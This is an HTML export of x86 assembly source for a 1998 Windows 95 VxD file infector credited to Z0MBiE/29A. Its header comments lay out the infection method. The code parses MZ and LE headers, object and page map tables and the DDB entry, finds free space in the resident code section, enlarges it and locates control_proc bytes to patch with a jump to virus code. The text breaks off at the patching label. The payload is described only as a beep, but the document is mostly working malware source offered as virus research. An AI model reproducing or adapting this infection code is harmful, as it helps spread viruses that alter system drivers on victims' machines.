<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                                VxD-infection</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  programmed in 1998 by Z0MBiE/29A</span><span class="sc0">
</span><span class="sc1">;  all rights reserved</span><span class="sc0">
</span><span class="sc1">;  *** NOT FOR [RE]PUBLISHING/DISASM IN VX-ZINES, EXCEPT 29A ***</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  ABOUT THIS PROGRAM</span><span class="sc0">
</span><span class="sc1">;    infected VxDs (file name given in command line) will beep</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;    program writes 'OK' if file infected</span><span class="sc0">
</span><span class="sc1">;    program writes 'X'  if cant disassemble instruction</span><span class="sc0">
</span><span class="sc1">;       most of control_procs are written using control_dispatch macro, so</span><span class="sc0">
</span><span class="sc1">;       disassembler must understand not more than 5-10 opcodes...</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  INFECTION METHOD: (i think Navrhar-alike)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;    1. find DDEEntry</span><span class="sc0">
</span><span class="sc1">;    2. check its CODE section: it must be RESIDENT, CODE32, etc.</span><span class="sc0">
</span><span class="sc1">;    3. check enough free space in this CODE section</span><span class="sc0">
</span><span class="sc1">;    3. patch control_proc:</span><span class="sc0">
</span><span class="sc1">;        control_proc_x:   [some instructions-with-possible-fixups skipped]</span><span class="sc0">
</span><span class="sc1">;                          jmp virus</span><span class="sc0">
</span><span class="sc1">;        virus:            ; restore bytes, return control</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  COMMENTS</span><span class="sc0">
</span><span class="sc1">;    Also VxDs can be infected by adding virus section... but its not easy</span><span class="sc0">
</span><span class="sc1">;    task, becose all data tables are "packed", i.e. not aligned, so no free</span><span class="sc0">
</span><span class="sc1">;    space between these tables.</span><span class="sc0">
</span><span class="sc1">;    But there always exist free space between last data table ("per-page</span><span class="sc0">
</span><span class="sc1">;      checksum table") and first data page (as a rule LCOD, code section)</span><span class="sc0">
</span><span class="sc1">;    So its really possible to add one more objectentry to objecttable</span><span class="sc0">
</span><span class="sc1">;    But if this entry will be added we must add one or more entries to</span><span class="sc0">
</span><span class="sc1">;    following page-map-table, which also has no free space.</span><span class="sc0">
</span><span class="sc1">;    When its all will be done, we must _INSERT_ our code section between</span><span class="sc0">
</span><span class="sc1">;    last data page and non-resident-names-table, which is last in the file.</span><span class="sc0">
</span><span class="sc1">;    I will try to implement this method in next research, so results</span><span class="sc0">
</span><span class="sc1">;    will appears in nearest future.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  TO INFECT VxDs-FILES USED:</span><span class="sc0">
</span><span class="sc1">;    1. sense what VxDs &amp; Windows`95 will be forgotten -</span><span class="sc0">
</span><span class="sc1">;       and these files will be not infected by me ;)</span><span class="sc0">
</span><span class="sc1">;    2. talks about Navrhar virus - my greetings to author!</span><span class="sc0">
</span><span class="sc1">;    3. best music in the world - Scorpions</span><span class="sc0">
</span><span class="sc1">;    4. some documentation - see directory DOC, its all i found</span><span class="sc0">
</span><span class="sc1">;         also you can see winnt.h, but only header defined there</span><span class="sc0">
</span><span class="sc1">;    5. stuff from Reptile/29A - "how to compile VxD"</span><span class="sc0">
</span><span class="sc1">;    6. TASM, HIEW, IDA</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  COMMENTS</span><span class="sc0">
</span><span class="sc1">;    if you have something to say about VxD format/infection/...,</span><span class="sc0">
</span><span class="sc1">;    or if you have VxD format description -</span><span class="sc0">
</span><span class="sc1">;    mail me to z0mbie_29a@yahoo.com</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  last updated at  9-08-98</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0">                 </span><span class="sc9">INCLUDE</span><span class="sc0">\</span><span class="sc5">HIEW_VMM.INC</span><span class="sc0">    </span><span class="sc1">; VxD services</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0">                 </span><span class="sc9">INCLUDE</span><span class="sc0">\</span><span class="sc5">VXD_CALL.INC</span><span class="sc0">    </span><span class="sc1">; VxDCall/VMMCall macros</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0">                 </span><span class="sc9">INCLUDE</span><span class="sc0">\</span><span class="sc5">VMM.INC</span><span class="sc0">         </span><span class="sc1">; some files from MASM</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0">                 </span><span class="sc9">INCLUDE</span><span class="sc0">\</span><span class="sc5">IFS.INC</span><span class="sc0">

                        </span><span class="sc5">model</span><span class="sc0">   </span><span class="sc10">tiny</span><span class="sc0">
                        </span><span class="sc5">p386</span><span class="sc0">
                        </span><span class="sc5">locals</span><span class="sc0">  </span><span class="sc5">__</span><span class="sc0">
                        </span><span class="sc5">jumps</span><span class="sc0">

</span><span class="sc1">;cgroup                  group   code, ldr, vxd</span><span class="sc0">
</span><span class="sc5">cgroup</span><span class="sc0">                  </span><span class="sc9">group</span><span class="sc0">   </span><span class="sc5">code</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ldr</span><span class="sc0">

</span><span class="sc5">code</span><span class="sc0">                    </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">use16</span><span class="sc0">
                        </span><span class="sc9">assume</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">cgroup</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">cgroup</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">cgroup</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">cgroup</span><span class="sc0">

                        </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc2">100h</span><span class="sc0">

</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0081h</span><span class="sc0">       </span><span class="sc1">; command line</span><span class="sc0">

</span><span class="sc5">__1</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">          </span><span class="sc1">; skip spaces</span><span class="sc0">
                        </span><span class="sc6">lodsb</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__exit</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__1</span><span class="sc0">

</span><span class="sc5">__3</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc6">lodsb</span><span class="sc0">                   </span><span class="sc1">; find #13</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__2</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__3</span><span class="sc0">
</span><span class="sc5">__2</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">60h</span><span class="sc0">         </span><span class="sc1">; convert/copy file name</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">filename</span><span class="sc0">
                        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc1">;                       lea     si, filename    ; store filename for</span><span class="sc0">
</span><span class="sc1">;                       lea     di, ldr_vxd_name; VxD-loader</span><span class="sc0">
</span><span class="sc1">;                       mov     cx, 128</span><span class="sc0">
</span><span class="sc1">;                       rep     movsb</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3d02h</span><span class="sc0">       </span><span class="sc1">; open target file</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">filename</span><span class="sc0">
                        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
                        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">__exit</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">handle</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">mz</span><span class="sc0">          </span><span class="sc1">; read MZ header</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">mz_size</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">readfile</span><span class="sc0">

                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">        </span><span class="sc1">; seek LE header</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seek_edx_mz</span><span class="sc0">

                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">le_header</span><span class="sc0">   </span><span class="sc1">; read LE header</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">le_size</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">readfile</span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">le_magic</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'EL'</span><span class="sc0">  </span><span class="sc1">; check for valid LE header</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__close</span><span class="sc0">

                        </span><span class="sc1">; check for valid number of OBJECT ENTRIES</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">le_object_table_entries</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">max_objs</span><span class="sc0">
                        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">__close</span><span class="sc0">

                        </span><span class="sc1">; check for valid number of PAGES</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">le_number_of_memory_pages</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">max_pages</span><span class="sc0">
                        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">__close</span><span class="sc0">

                        </span><span class="sc1">; seek OBJECT TABLE</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">le_object_table_offset</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seek_edx_mz</span><span class="sc0">

                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ot</span><span class="sc0">          </span><span class="sc1">; read OBJECT TABLE</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">max_ot_size</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">readfile</span><span class="sc0">

                        </span><span class="sc1">; seek PAGE MAP TABLE</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">le_object_page_map_table_offset</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seek_edx_mz</span><span class="sc0">

                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pmt</span><span class="sc0">         </span><span class="sc1">; read PAGE MAP TABLE</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">max_pmt_size</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">readfile</span><span class="sc0">

                        </span><span class="sc1">; seek ENTRY TABLE</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">le_entry_table_offset</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seek_edx_mz</span><span class="sc0">

                        </span><span class="sc1">; read ENTRY TABLE</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">et</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">max_et_size</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">readfile</span><span class="sc0">

                        </span><span class="sc1">; analyzing only 1st entry</span><span class="sc0">

                        </span><span class="sc1">; check entry type</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">et.byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11b</span><span class="sc0">  </span><span class="sc1">; valid/32bit</span><span class="sc0">
                        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">__close</span><span class="sc0">

                        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">et.word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                        </span><span class="sc1">; edi=section #, where DDBEntry info located</span><span class="sc0">

                        </span><span class="sc1">; si=section offset</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">oe_struc</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ot</span><span class="sc0">

                        </span><span class="sc1">; check section flags</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.oe_flags</span><span class="sc0">
                        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0010001101000101b</span><span class="sc0">  </span><span class="sc1">; 32-bit, resident,</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0010000001000101b</span><span class="sc0">  </span><span class="sc1">; normal, read, exec</span><span class="sc0">
                        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">__close</span><span class="sc0">

                        </span><span class="sc1">; calculate free space in object section</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.oe_page_map_entries</span><span class="sc0">
                        </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">le_memory_page_size</span><span class="sc0">
                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.oe_virtual_segment_size</span><span class="sc0">

                        </span><span class="sc1">; check for enough free space</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ldr_size</span><span class="sc0">
                        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">__close</span><span class="sc0">

                        </span><span class="sc1">; calculate our PAGE #</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.oe_page_map_index</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.oe_page_map_entries</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc1">; eax = PAGE MAP TABLE entry</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pmt</span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">

                        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FF000000h</span><span class="sc0">   </span><span class="sc1">; page type: normal</span><span class="sc0">
                        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">__close</span><span class="sc0">

                        </span><span class="sc1">; calculate file offset</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">   </span><span class="sc1">; dx = high page number</span><span class="sc0">
                        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">  </span><span class="sc1">; eax = low page number</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                        </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">le_memory_page_size</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">le_data_pages_offset</span><span class="sc0">
                        </span><span class="sc1">; now EAX=offset of PAGE with our code</span><span class="sc0">

                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">le_memory_page_size</span><span class="sc0">
                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc1">; now EAX=offset of OUR CODE in file</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">our_offs</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc1">; increase section`s code size</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.oe_virtual_segment_size</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ldr_size</span><span class="sc0">

                        </span><span class="sc1">; convert section # to file offset</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pmt</span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
                        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
                        </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">le_memory_page_size</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">le_data_pages_offset</span><span class="sc0">
                        </span><span class="sc1">; now EDX=offset of our section</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">sect_offs</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">et.dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
                        </span><span class="sc1">; now EDX=offset of DDB Entry</span><span class="sc0">

                        </span><span class="sc1">; seek DDBEntry</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seek_edx</span><span class="sc0">

                        </span><span class="sc1">; read DDBEntry</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ddb</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">max_ddb_size</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">readfile</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ddb.dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc0"> </span><span class="sc1">; control_proc_X</span><span class="sc0">
                        </span><span class="sc1">;; maybe its mistake</span><span class="sc0">
                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.oe_relocation_base_address</span><span class="sc0">
                        </span><span class="sc1">;;</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">sect_offs</span><span class="sc0">
                        </span><span class="sc1">; now EDX=offset of control_proc_X in FILE</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">cp_offs</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

                        </span><span class="sc1">; seek control_proc_X</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seek_edx</span><span class="sc0">

                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">cp</span><span class="sc0">          </span><span class="sc1">; read control_proc_X</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">max_cp_size</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">readfile</span><span class="sc0">

                        </span><span class="sc1">; analyze control_proc_x</span><span class="sc0">

                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">cp</span><span class="sc0">

</span><span class="sc5">__restart</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">    </span><span class="sc1">; pointer to byte to patch</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">    </span><span class="sc1">; "free" space counter</span><span class="sc0">

</span><span class="sc5">__nextcmd</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">cp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">max_cp_size</span><span class="sc0">
                        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">__close</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_cmd_size</span><span class="sc0">
                        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">__close</span><span class="sc0">

                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
                        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">__restart</span><span class="sc0">

                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
                        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">__nextcmd</span><span class="sc0">

</span><span class="sc5">__patch</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">; okey, space found - calculate some values</span><span class="sc0">
